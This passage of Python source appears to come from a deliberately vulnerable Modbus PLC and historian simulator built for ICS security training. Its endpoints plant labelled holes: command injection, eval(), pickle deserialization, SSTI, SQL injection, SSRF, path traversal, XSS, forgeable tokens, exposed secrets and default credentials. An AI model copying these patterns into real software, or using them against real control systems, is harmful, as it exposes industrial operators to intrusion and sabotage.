    tank1_pressure = PROCESS_STATE.get('tank1_pressure', 101.3)
    if not isinstance(tank1_pressure, (int, float)):
        tank1_pressure = 101.3
    PROCESS_STATE['tank1_pressure'] = max(90, min(150, tank1_pressure + random.uniform(-1, 1)))

    # Simulate Tank 2 changes
    tank2_level = PROCESS_STATE.get('tank2_level', 75.0)
    if not isinstance(tank2_level, (int, float)):
        tank2_level = 75.0
    PROCESS_STATE['tank2_level'] = max(0, min(100, tank2_level + random.uniform(-1.5, 1.5)))

    tank2_temp = PROCESS_STATE.get('tank2_temp', 30.0)
    if not isinstance(tank2_temp, (int, float)):
        tank2_temp = 30.0
    PROCESS_STATE['tank2_temp'] = max(20, min(100, tank2_temp + random.uniform(-0.3, 0.3)))

    # Simulate sensor changes
    flow_rate = PROCESS_STATE.get('flow_rate', 15.5)
    if not isinstance(flow_rate, (int, float)):
        flow_rate = 15.5
    PROCESS_STATE['flow_rate'] = max(0, min(50, flow_rate + random.uniform(-2, 2)))

    vibration = PROCESS_STATE.get('vibration', 2.5)
    if not isinstance(vibration, (int, float)):
        vibration = 2.5
    PROCESS_STATE['vibration'] = max(0, min(10, vibration + random.uniform(-0.5, 0.5)))

    ph_level = PROCESS_STATE.get('ph_level', 7.0)
    if not isinstance(ph_level, (int, float)):
        ph_level = 7.0
    PROCESS_STATE['ph_level'] = max(0, min(14, ph_level + random.uniform(-0.2, 0.2)))

    # Check for alarm conditions
    if PROCESS_STATE['tank1_level'] > 90:
        add_alarm('HIGH', 'Tank 1 level critically high')
    if PROCESS_STATE['tank1_level'] < 10:
        add_alarm('HIGH', 'Tank 1 level critically low')
    if PROCESS_STATE['tank1_temp'] > 80:
        add_alarm('MEDIUM', 'Tank 1 temperature high')
    if PROCESS_STATE['tank1_pressure'] > 140:
        add_alarm('HIGH', 'Tank 1 pressure too high')
    if PROCESS_STATE['tank2_level'] > 95:
        add_alarm('HIGH', 'Tank 2 overflow risk')
    if PROCESS_STATE['vibration'] > 8:
        add_alarm('MEDIUM', 'High vibration detected')
    if PROCESS_STATE['emergency_stop']:
        add_alarm('HIGH', 'EMERGENCY STOP ACTIVATED')

    # Return formatted data for HMI
    response = {
        'tank_level': PROCESS_STATE['tank1_level'],
        'temperature': PROCESS_STATE['tank1_temp'],
        'pressure': PROCESS_STATE['tank1_pressure'],
        'flow_rate': PROCESS_STATE['flow_rate'],
        'pump_status': PROCESS_STATE['pump1_status'],
        'valve_status': PROCESS_STATE['valve1_status'],
        # Include full state for advanced access (convert proxy to dict)
        'full_state': shared_state.load_state()
    }

    return jsonify(response)

@app.route('/api/process/control', methods=['POST'])
@require_role('admin', 'operator')
def process_control():
    """Control process equipment - operator and admin only"""
    data = request.get_json()
    action = data.get('action')
    value = data.get('value')

    # HMI simplified controls
    if action == 'pump':
        PROCESS_STATE['pump1_status'] = value
        log_action(session['username'], 'control_pump', f'Pump set to {value}')
    elif action == 'valve':
        PROCESS_STATE['valve1_status'] = value
        log_action(session['username'], 'control_valve', f'Valve set to {value}')
    elif action == 'reset_tank':
        PROCESS_STATE['tank1_level'] = 50.0
        PROCESS_STATE['tank1_temp'] = 25.0
        PROCESS_STATE['tank1_pressure'] = 101.3
        log_action(session['username'], 'reset_tank', 'Tank reset to defaults')

    # Pumps
    elif action == 'pump1_status':
        PROCESS_STATE['pump1_status'] = value
        log_action(session['username'], 'control_pump1', f'Pump 1 set to {value}')
    elif action == 'pump2_status':
        PROCESS_STATE['pump2_status'] = value
        log_action(session['username'], 'control_pump2', f'Pump 2 set to {value}')
    elif action == 'pump3_status':
        PROCESS_STATE['pump3_status'] = value
        log_action(session['username'], 'control_pump3', f'Pump 3 set to {value}')

    # Pump speeds
    elif action == 'pump1_speed':
        PROCESS_STATE['pump1_speed'] = int(value)
        log_action(session['username'], 'control_pump1_speed', f'Pump 1 speed set to {value}')
    elif action == 'pump2_speed':
        PROCESS_STATE['pump2_speed'] = int(value)
        log_action(session['username'], 'control_pump2_speed', f'Pump 2 speed set to {value}')

    # Valves
    elif action == 'valve1_status':
        PROCESS_STATE['valve1_status'] = value
        log_action(session['username'], 'control_valve1', f'Valve 1 set to {value}')
    elif action == 'valve2_status':
        PROCESS_STATE['valve2_status'] = value
        log_action(session['username'], 'control_valve2', f'Valve 2 set to {value}')
    elif action == 'valve3_status':
        PROCESS_STATE['valve3_status'] = value
        log_action(session['username'], 'control_valve3', f'Valve 3 (Emergency) set to {value}')
    elif action == 'valve4_status':
        PROCESS_STATE['valve4_status'] = value
        log_action(session['username'], 'control_valve4', f'Valve 4 (Bypass) set to {value}')

    # Motors
    elif action == 'motor1_speed':
        PROCESS_STATE['motor1_speed'] = int(value)
        log_action(session['username'], 'control_motor1', f'Motor 1 speed set to {value}')
    elif action == 'motor2_speed':
        PROCESS_STATE['motor2_speed'] = int(value)
        log_action(session['username'], 'control_motor2', f'Motor 2 speed set to {value}')

    # Heaters/Coolers
    elif action == 'heater1_status':
        PROCESS_STATE['heater1_status'] = value
        log_action(session['username'], 'control_heater', f'Heater set to {value}')
    elif action == 'cooler1_status':
        PROCESS_STATE['cooler1_status'] = value
        log_action(session['username'], 'control_cooler', f'Cooler set to {value}')

    # Conveyor
    elif action == 'conveyor_status':
        PROCESS_STATE['conveyor_status'] = value
        log_action(session['username'], 'control_conveyor', f'Conveyor set to {value}')
    elif action == 'conveyor_speed':
        PROCESS_STATE['conveyor_speed'] = int(value)
        log_action(session['username'], 'control_conveyor_speed', f'Conveyor speed set to {value}')

    # Safety
    elif action == 'emergency_stop':
        PROCESS_STATE['emergency_stop'] = value
        log_action(session['username'], 'emergency_stop', f'Emergency stop set to {value}')
    elif action == 'safety_interlock':
        PROCESS_STATE['safety_interlock'] = value
        log_action(session['username'], 'safety_interlock', f'Safety interlock set to {value}')

    # Tank reset
    elif action == 'reset_tank1':
        PROCESS_STATE['tank1_level'] = 50.0
        log_action(session['username'], 'reset_tank1', 'Tank 1 level reset')
    elif action == 'reset_tank2':
        PROCESS_STATE['tank2_level'] = 50.0
        log_action(session['username'], 'reset_tank2', 'Tank 2 level reset')

    return jsonify({'success': True, 'state': shared_state.load_state()})

@app.route('/api/alarms/list')
def alarms_list():
    """Get active alarms"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    return jsonify({'alarms': PROCESS_STATE['alarms']})

@app.route('/api/alarms/acknowledge', methods=['POST'])
@require_role('admin', 'operator')
def alarms_acknowledge():
    """Acknowledge an alarm - operator and admin only"""
    data = request.get_json()
    alarm_id = data.get('id')

    # Remove alarm
    PROCESS_STATE['alarms'] = [a for a in PROCESS_STATE['alarms'] if a['id'] != alarm_id]
    log_action(session['username'], 'ack_alarm', f'Acknowledged alarm {alarm_id}')

    return jsonify({'success': True})

@app.route('/api/security/alerts')
def security_alerts():
    """Get security alerts from IDS - for visual display"""
    # No authentication required - security alerts should be visible!
    alerts = shared_state.get_state('security_alerts', [])

    # Return last 10 alerts
    return jsonify({
        'success': True,
        'alerts': alerts[-10:] if len(alerts) > 10 else alerts,
        'total': len(alerts)
    })

@app.route('/api/security/alerts/clear', methods=['POST'])
@require_role('admin', 'operator')
def clear_security_alerts():
    """Clear all security alerts"""
    shared_state.update_state('security_alerts', [])
    log_action(session['username'], 'clear_alerts', 'Cleared all security alerts')
    return jsonify({'success': True})

@app.route('/api/security/alerts/export')
def export_security_alerts():
    """Export security alerts to CSV file"""
    # Get all alerts
    alerts = shared_state.get_state('security_alerts', [])

    # Create CSV in memory
    si = StringIO()
    writer = csv.writer(si)

    # Write header
    writer.writerow(['Timestamp', 'PLC', 'Severity', 'Type', 'Message', 'Source IP', 'Function Code', 'Address'])

    # Write alert data
    for alert in alerts:
        writer.writerow([
            alert.get('timestamp', ''),
            alert.get('plc', 'Unknown'),
            alert.get('severity', ''),
            alert.get('type', ''),
            alert.get('message', ''),
            alert.get('source_ip', ''),
            f"0x{alert.get('function_code', 0):02X}",
            alert.get('address', '')
        ])

    # Create response with CSV
    output = make_response(si.getvalue())
    output.headers["Content-Disposition"] = f"attachment; filename=security_alerts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    output.headers["Content-type"] = "text/csv"

    # Log export action
    if 'username' in session:
        log_action(session['username'], 'export_alerts', f'Exported {len(alerts)} security alerts to CSV')

    return output

@app.route('/api/trending/data')
def trending_data():
    """Get historical trending data"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    # Generate fake historical data
    hours = 24
    data = {
        'timestamps': [],
        'tank_level': [],
        'temperature': [],
        'pressure': [],
        'flow_rate': []
    }

    now = datetime.now()
    for i in range(hours * 6):  # Every 10 minutes
        time = now - timedelta(minutes=i*10)
        data['timestamps'].insert(0, time.strftime('%H:%M'))
        data['tank_level'].insert(0, 50 + random.uniform(-20, 20))
        data['temperature'].insert(0, 25 + random.uniform(-5, 15))
        data['pressure'].insert(0, 101 + random.uniform(-10, 10))
        data['flow_rate'].insert(0, 15 + random.uniform(-5, 10))

    return jsonify(data)

def add_alarm(severity, message):
    """
    Add an alarm to the system (Task 6: fixed ID generation)
    Uses UUID to prevent ID reuse and ensure unique alarm identifiers
    """
    # Get current alarms list
    current_alarms = PROCESS_STATE.get('alarms', [])

    # Ensure it's a list (Task 5: type safety)
    if not isinstance(current_alarms, list):
        current_alarms = []

    alarm = {
        'id': str(uuid.uuid4()),  # Task 6: UUID instead of len()+1
        'severity': severity,
        'message': message,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'acknowledged': False
    }

    # Don't duplicate alarms (keep deduplication by message)
    if not any(a.get('message') == message for a in current_alarms):
        current_alarms.append(alarm)
        # Write back the modified list to persist changes
        PROCESS_STATE['alarms'] = current_alarms

# ============================================
# ADDITIONAL VULNERABILITIES FOR TESTING
# ============================================

@app.route('/api/search')
def search():
    """VULNERABILITY: Reflected XSS"""
    query = request.args.get('q', '')
    # No sanitization - direct output
    return f"""
    <html>
    <body>
    <h1>Search Results</h1>
    <p>You searched for: {query}</p>
    <p>No results found.</p>
    </body>
    </html>
    """

@app.route('/api/comment', methods=['POST'])
def comment():
    """VULNERABILITY: Stored XSS"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    comment_text = request.form.get('comment', '')
    # Store in database without sanitization
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, user TEXT, comment TEXT, timestamp TEXT)")
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO comments (user, comment, timestamp) VALUES (?, ?, ?)",
              (session['username'], comment_text, timestamp))
    conn.commit()
    conn.close()

    return jsonify({'success': True, 'message': 'Comment added'})

@app.route('/api/comments')
def comments():
    """Display comments with XSS vulnerability"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    try:
        c.execute("SELECT user, comment, timestamp FROM comments ORDER BY id DESC LIMIT 50")
        comments_list = c.fetchall()
    except:
        comments_list = []
    conn.close()

    html = "<html><body><h1>Comments</h1>"
    for user, comment, timestamp in comments_list:
        # VULNERABILITY: No escaping
        html += f"<div><strong>{user}</strong> ({timestamp}): {comment}</div>"
    html += "</body></html>"

    return html

@app.route('/api/upload', methods=['POST'])
@require_role('admin', 'operator')
def upload_file():
    """VULNERABILITY: Unrestricted file upload"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # VULNERABILITY: No file type validation, no sanitization
    upload_dir = 'uploads'
    os.makedirs(upload_dir, exist_ok=True)

    # Directly use user-provided filename (dangerous)
    filepath = os.path.join(upload_dir, file.filename)
    file.save(filepath)

    log_action(session['username'], 'file_upload', f'Uploaded {file.filename}')

    return jsonify({
        'success': True,
        'filename': file.filename,
        'path': filepath
    })

@app.route('/api/download/<path:filename>')
def download_file(filename):
    """VULNERABILITY: Path traversal in file download"""
    # No path validation - allows directory traversal
    try:
        with open(filename, 'rb') as f:
            content = f.read()
        return content
    except Exception as e:
        return jsonify({'error': str(e)}), 404

@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    """VULNERABILITY: Insecure Direct Object Reference (IDOR)"""
    # No authorization check - any logged in user can view any user
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("SELECT id, username, role FROM users WHERE id=?", (user_id,))
    user = c.fetchone()
    conn.close()

    if user:
        return jsonify({
            'id': user[0],
            'username': user[1],
            'role': user[2]
        })
    else:
        return jsonify({'error': 'User not found'}), 404

@app.route('/api/modify_user', methods=['POST'])
def modify_user():
    """VULNERABILITY: Mass assignment / IDOR"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    # VULNERABILITY: No authorization check, accepts user_id from request
    user_id = request.form.get('user_id')
    new_role = request.form.get('role')

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("UPDATE users SET role=? WHERE id=?", (new_role, user_id))
    conn.commit()
    conn.close()

    log_action(session['username'], 'modify_user', f'Modified user {user_id} to role {new_role}')

    return jsonify({'success': True, 'message': f'User {user_id} updated to {new_role}'})

@app.route('/api/xml', methods=['POST'])
def parse_xml():
    """VULNERABILITY: XML External Entity (XXE)"""
    xml_data = request.data.decode('utf-8')

    try:
        import xml.etree.ElementTree as ET
        # VULNERABILITY: No protection against XXE
        root = ET.fromstring(xml_data)
        return jsonify({
            'success': True,
            'data': ET.tostring(root, encoding='unicode')
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/eval', methods=['POST'])
@require_role('admin')
def eval_code():
    """VULNERABILITY: Code injection / eval()"""
    code = request.form.get('code', '')

    try:
        # EXTREMELY DANGEROUS - Never do this in real code
        result = eval(code)
        log_action(session['username'], 'eval_code', f'Evaluated: {code}')
        return jsonify({'success': True, 'result': str(result)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/modbus/raw', methods=['POST'])
def modbus_raw():
    """VULNERABILITY: Unauthenticated Modbus control"""
    # No authentication required for raw Modbus commands
    register = request.form.get('register', 0, type=int)
    value = request.form.get('value', 0, type=int)

    # Direct register manipulation without authorization
    PROCESS_STATE['api_access_count'] = PROCESS_STATE.get('api_access_count', 0) + 1

    log_action('ANONYMOUS', 'modbus_raw', f'Register {register} = {value}')

    return jsonify({
        'success': True,
        'register': register,
        'value': value,
        'message': 'Raw Modbus command executed (unauthenticated)'
    })

@app.route('/api/keys')
def get_api_keys():
    """VULNERABILITY: Exposed API keys"""
    # Returns sensitive keys without authentication
    return jsonify({
        'api_key': PROCESS_STATE['api_key'],
        'secret_token': PROCESS_STATE['secret_token'],
        'database_path': 'plc.db',
        'secret_key': app.secret_key
    })

@app.route('/api/ping')
def ping():
    """VULNERABILITY: Command injection via ping"""
    host = request.args.get('host', 'localhost')

    try:
        # VULNERABILITY: No input validation
        result = subprocess.check_output(f'ping -c 1 {host}', shell=True, stderr=subprocess.STDOUT, timeout=5)
        return jsonify({'success': True, 'output': result.decode('utf-8')})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

# ============================================
# ADVANCED VULNERABILITIES (TRICKY EXPLOITATION)
# ============================================

@app.route('/operator/report', methods=['GET', 'POST'])
@require_role('admin', 'operator')
def generate_report():
    """VULNERABILITY: Server-Side Template Injection (SSTI)"""
    if request.method == 'POST':
        from jinja2 import Template

        report_title = request.form.get('title', 'System Report')
        report_type = request.form.get('type', 'summary')

        # VULNERABILITY: Direct template rendering from user input
        template_string = request.form.get('template', '')

        if not template_string:
            # Default template
            template_string = """
            <html>
            <body>
            <h1>{{ title }}</h1>
            <p>Report Type: {{ type }}</p>
            <p>Generated by: {{ user }}</p>
            <p>Timestamp: {{ timestamp }}</p>
            </body>
            </html>
            """

        try:
            # VULNERABILITY: User-controlled template - SSTI
            template = Template(template_string)
            rendered = template.render(
                title=report_title,
                type=report_type,
                user=session.get('username'),
                timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            )

            log_action(session['username'], 'generate_report', f'Generated {report_type} report')

            return rendered
        except Exception as e:
            return f"Error rendering template: {str(e)}", 400

    return render_template('report.html',
                          username=session.get('username'),
                          role=session.get('role'))

@app.route('/operator/search')
@require_role('admin', 'operator')
def search_logs():
    """VULNERABILITY: Blind SQL Injection in search"""
    search_term = request.args.get('q', '')
    search_type = request.args.get('type', 'action')

    # If no search term, show search form
    if not search_term:
        return render_template('search.html')

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # VULNERABILITY: Blind SQL Injection
    # Operator can search logs, but query is vulnerable
    if search_type == 'action':
        query = f"SELECT COUNT(*) FROM logs WHERE action LIKE '%{search_term}%'"
    elif search_type == 'user':
        query = f"SELECT COUNT(*) FROM logs WHERE user LIKE '%{search_term}%'"
    else:
        query = f"SELECT COUNT(*) FROM logs WHERE details LIKE '%{search_term}%'"

    try:
        print(f"[SEARCH] Executing: {query}")
        c.execute(query)
        count = c.fetchone()[0]
        conn.close()

        # Return JSON if it looks like an API request
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({
                'success': True,
                'query': search_term,
                'type': search_type,
                'results': count,
                'message': f'Found {count} results'
            })
        else:
            # Return HTML page
            return render_template('search.html', results=count, query=search_term, search_type=search_type)
    except Exception as e:
        conn.close()
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({'error': str(e)}), 400
        else:
            return render_template('search.html', error=str(e), query=search_term)

@app.route('/operator/export', methods=['GET', 'POST'])
@require_role('admin', 'operator')
def export_data():
    """VULNERABILITY: Insecure Deserialization"""
    if request.method == 'GET':
        return render_template('operator_export.html',
                              username=session.get('username'),
                              role=session.get('role'))

    import pickle
    import base64

    export_type = request.form.get('type', 'logs')

    # Create export data
    if export_type == 'logs':
        conn = sqlite3.connect('plc.db')
        c = conn.cursor()
        c.execute(f"SELECT * FROM logs WHERE user='{session.get('username')}' LIMIT 50")
        data = c.fetchall()
        conn.close()
    elif export_type == 'alarms':
        data = PROCESS_STATE.get('alarms', [])
    else:
        data = {'error': 'Invalid export type'}

    # VULNERABILITY: Pickle serialization exposes attack surface
    pickled = pickle.dumps(data)
    encoded = base64.b64encode(pickled).decode('utf-8')

    log_action(session['username'], 'export_data', f'Exported {export_type}')

    # Return JSON for API calls, HTML for browser
    if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
        return jsonify({
            'success': True,
            'export_type': export_type,
            'data': encoded,
            'format': 'base64-pickle'
        })
    else:
        return render_template('operator_export.html',
                              username=session.get('username'),
                              role=session.get('role'),
                              export_data=encoded)

@app.route('/operator/import', methods=['POST'])
@require_role('admin', 'operator')
def import_data():
    """VULNERABILITY: Insecure Deserialization - RCE vector"""
    import pickle
    import base64

    encoded_data = request.form.get('data', '')

    try:
        # VULNERABILITY: Unpickling user-controlled data - RCE!
        decoded = base64.b64decode(encoded_data)
        data = pickle.loads(decoded)

        log_action(session['username'], 'import_data', 'Imported data')

        records = len(data) if isinstance(data, (list, dict)) else 1

        # Return JSON for API calls, HTML for browser
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({
                'success': True,
                'message': 'Data imported successfully',
                'records': records
            })
        else:
            return render_template('operator_export.html',
                                  username=session.get('username'),
                                  role=session.get('role'),
                                  import_result=f'Successfully imported {records} records')
    except Exception as e:
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({'error': str(e)}), 400
        else:
            return render_template('operator_export.html',
                                  username=session.get('username'),
                                  role=session.get('role'),
                                  error=str(e))

@app.route('/operator/config', methods=['GET', 'POST'])
@require_role('admin', 'operator')
def operator_config():
    """VULNERABILITY: Mass Assignment + Configuration Injection"""
    if request.method == 'POST':
        # VULNERABILITY: Accepts any configuration parameters
        config = {}

        # Check for custom parameters (mass assignment vuln)
        custom_key = request.form.get('custom_key', '')
        custom_value = request.form.get('custom_value', '')

        if custom_key and custom_value:
            # VULNERABILITY: Direct assignment of any key-value pair
            config[custom_key] = custom_value
        else:
            # Normal form fields
            for key, value in request.form.items():
                if key not in ['custom_key', 'custom_value']:
                    config[key] = value

        # Store in session (dangerous - can override role, username, etc.)
        for key, value in config.items():
            session[key] = value

        log_action(session['username'], 'update_config', f'Updated config: {list(config.keys())}')

        # Return JSON for API calls, HTML for browser
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({
                'success': True,
                'message': 'Configuration updated',
                'config': config
            })
        else:
            return render_template('operator_config.html',
                                  username=session.get('username'),
                                  role=session.get('role'),
                                  current_config=dict(session),
                                  success=True)

    # GET request - show form
    return render_template('operator_config.html',
                          username=session.get('username'),
                          role=session.get('role'),
                          current_config=dict(session))

@app.route('/operator/webhook', methods=['POST'])
@require_role('admin', 'operator')
def webhook():
    """VULNERABILITY: SSRF (Server-Side Request Forgery)"""
    webhook_url = request.form.get('url', '')
    event_type = request.form.get('event', 'alarm')

    # VULNERABILITY: No URL validation - can hit internal services
    try:
        import requests as req
        payload = {
            'event': event_type,
            'user': session.get('username'),
            'timestamp': datetime.now().isoformat()
        }

        # SSRF - operator can make server request any URL
        response = req.post(webhook_url, json=payload, timeout=5)

        log_action(session['username'], 'webhook_call', f'Called webhook: {webhook_url}')

        return jsonify({
            'success': True,
            'status_code': response.status_code,
            'response': response.text[:500]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/operator/token', methods=['GET', 'POST'])
@require_role('admin', 'operator')
def get_token():
    """VULNERABILITY: Weak JWT-like token generation"""
    import hashlib
    import time

    if request.method == 'POST':
        # VULNERABILITY: Predictable token generation
        user = session.get('username')
        role = session.get('role')
        timestamp = str(int(time.time()))

        # Weak token: just MD5 hash of predictable data
        token_data = f"{user}:{role}:{timestamp}"
        token = hashlib.md5(token_data.encode()).hexdigest()

        token_info = {
            'token': token,
            'username': user,
            'role': role,
            'timestamp': timestamp,
            'hint': 'Token format: md5(username:role:timestamp)'
        }

        # Return JSON for API calls, HTML for browser
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({
                'success': True,
                **token_info
            })
        else:
            return render_template('operator_token.html',
                                  username=session.get('username'),
                                  role=session.get('role'),
                                  token_data=token_info)

    # GET request - show form
    return render_template('operator_token.html',
                          username=session.get('username'),
                          role=session.get('role'))

@app.route('/operator/validate', methods=['POST'])
def validate_token():
    """VULNERABILITY: Token validation bypass"""
    import hashlib

    token = request.form.get('token', '')
    username = request.form.get('username', '')
    role = request.form.get('role', '')

    # VULNERABILITY: Accepts any role if token format is correct
    # Can forge tokens by knowing the algorithm
    try:
        # Try to find valid timestamp (brute force window)
        import time
        current_time = int(time.time())

        for offset in range(-300, 300):  # 10 minute window
            check_time = str(current_time + offset)
            expected = hashlib.md5(f"{username}:{role}:{check_time}".encode()).hexdigest()

            if expected == token:
                # Valid token! Create session
                session['username'] = username
                session['role'] = role
                session['user_id'] = 999  # Fake ID

                result = {
                    'valid': True,
                    'message': f'Token validated successfully! Logged in as {username} with role {role}'
                }

                # Return JSON for API calls, HTML for browser
                if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
                    return jsonify({
                        'success': True,
                        'message': result['message'],
                        'username': username,
                        'role': role
                    })
                else:
                    return render_template('operator_token.html',
                                          username=username,
                                          role=role,
                                          validation_result=result)

        # Token not found in time window
        result = {
            'valid': False,
            'message': 'Invalid token or token expired'
        }

        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({'error': 'Invalid token'}), 401
        else:
            return render_template('operator_token.html',
                                  username=session.get('username', 'guest'),
                                  role=session.get('role', 'guest'),
                                  validation_result=result)
    except Exception as e:
        if request.headers.get('Accept') == 'application/json' or request.args.get('format') == 'json':
            return jsonify({'error': str(e)}), 400
        else:
            result = {
                'valid': False,
                'message': f'Error validating token: {str(e)}'
            }
            return render_template('operator_token.html',
                                  username=session.get('username', 'guest'),
                                  role=session.get('role', 'guest'),
                                  validation_result=result)

if __name__ == '__main__':
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘  Vulnerable Modbus PLC Simulator                          â•‘
    â•‘  FOR SECURITY TESTING AND EDUCATION ONLY                  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    Default Credentials:
      admin / admin       (Administrator)
      operator / operator123 (Operator)
      guest / guest       (Guest)

    Web Interface: http://localhost:5000
    Modbus TCP:    localhost:5502

    Known Vulnerabilities:
      â€¢ SQL Injection in login
      â€¢ Default credentials
      â€¢ Command injection in admin panel
      â€¢ Directory traversal
      â€¢ Information disclosure
      â€¢ Insufficient access controls
      â€¢ Session hijacking
      â€¢ Unauthenticated Modbus access
      â€¢ No register bounds checking

    WARNING: DO NOT EXPOSE TO INTERNET
    """)

    # Initialize database
    init_db()

    # Start Modbus TCP server in background thread
    print("[STARTUP] Starting Modbus TCP server...")
    start_modbus_server()

    # Give Modbus server time to bind to port
    import time
    time.sleep(0.5)

    # Start Flask application (this blocks)
    print("[STARTUP] Starting Flask web interface...")
    app.run(host='0.0.0.0', port=5000, debug=True)



================================================================================
FILE: core/historian.py
================================================================================
#!/usr/bin/env python3
"""
Historian Service - Time-Series Data Collection
Ports: 8086 (API), 8888 (Web UI)

Simulates OSIsoft PI / InfluxDB-like historian
Collects data from all PLCs for trending and analysis

INTENTIONALLY VULNERABLE - For security testing only
Vulnerabilities: Time-series injection, unauthorized access, query injection
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3
import threading
import time
from datetime import datetime, timedelta
import random
import json
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'historian-weak-secret-456'

shared_state.init_state()

# Initialize historian database
def init_historian_db():
    conn = sqlite3.connect('historian.db')
    c = conn.cursor()

    # Time-series data table
    c.execute('''CREATE TABLE IF NOT EXISTS timeseries
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  plc_id INTEGER,
                  tag_name TEXT,
                  value REAL,
                  quality TEXT)''')

    # Alarms table
    c.execute('''CREATE TABLE IF NOT EXISTS alarms
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  plc_id INTEGER,
                  alarm_type TEXT,
                  message TEXT,
                  severity TEXT,
                  acknowledged INTEGER DEFAULT 0)''')

    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS historian_users
                 (id INTEGER PRIMARY KEY,
                  username TEXT,
                  password TEXT,
                  role TEXT)''')

    # Insert default users
    c.execute("DELETE FROM historian_users")
    c.execute("INSERT INTO historian_users VALUES (1, 'historian', 'data123', 'admin')")
    c.execute("INSERT INTO historian_users VALUES (2, 'analyst', 'trend456', 'viewer')")
    c.execute("INSERT INTO historian_users VALUES (3, 'guest', 'guest', 'guest')")

    conn.commit()
    conn.close()

init_historian_db()

def data_collector():
    """Collect data from all PLCs every 5 seconds"""
    while True:
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            conn = sqlite3.connect('historian.db')
            c = conn.cursor()

            state = shared_state.load_state()

            # Collect PLC-1 data
            for key, value in state.items():
                if key.startswith('tank') or key.startswith('pump') or key.startswith('valve'):
                    if isinstance(value, (int, float, bool)):
                        c.execute("INSERT INTO timeseries (timestamp, plc_id, tag_name, value, quality) VALUES (?, ?, ?, ?, ?)",
                                (timestamp, 1, key, float(value), 'GOOD'))

            # Collect PLC-2 data
            for key, value in state.items():
                if key.startswith('plc2_'):
                    tag = key.replace('plc2_', '')
                    if isinstance(value, (int, float, bool)):
                        c.execute("INSERT INTO timeseries (timestamp, plc_id, tag_name, value, quality) VALUES (?, ?, ?, ?, ?)",
                                (timestamp, 2, tag, float(value), 'GOOD'))

            # Collect PLC-3 data
            for key, value in state.items():
                if key.startswith('plc3_'):
                    tag = key.replace('plc3_', '')
                    if isinstance(value, (int, float, bool)):
                        c.execute("INSERT INTO timeseries (timestamp, plc_id, tag_name, value, quality) VALUES (?, ?, ?, ?, ?)",
                                (timestamp, 3, tag, float(value), 'GOOD'))

            # Collect PLC-4 data
            for key, value in state.items():
                if key.startswith('plc4_'):
                    tag = key.replace('plc4_', '')
                    if isinstance(value, (int, float, bool)):
                        c.execute("INSERT INTO timeseries (timestamp, plc_id, tag_name, value, quality) VALUES (?, ?, ?, ?, ?)",
                                (timestamp, 4, tag, float(value), 'GOOD'))

            conn.commit()
            conn.close()

            # Clean up old data (keep last 24 hours)
            cleanup_old_data()

            time.sleep(5)
        except Exception as e:
            print(f"Data collector error: {e}")
            time.sleep(5)

def cleanup_old_data():
    """Remove data older than 24 hours"""
    try:
        cutoff = (datetime.now() - timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S')
        conn = sqlite3.connect('historian.db')
        c = conn.cursor()
        c.execute("DELETE FROM timeseries WHERE timestamp < ?", (cutoff,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Cleanup error: {e}")

@app.route('/')
def index():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for('dashboard'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    """VULNERABILITY: SQL Injection"""
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABILITY: SQL Injection
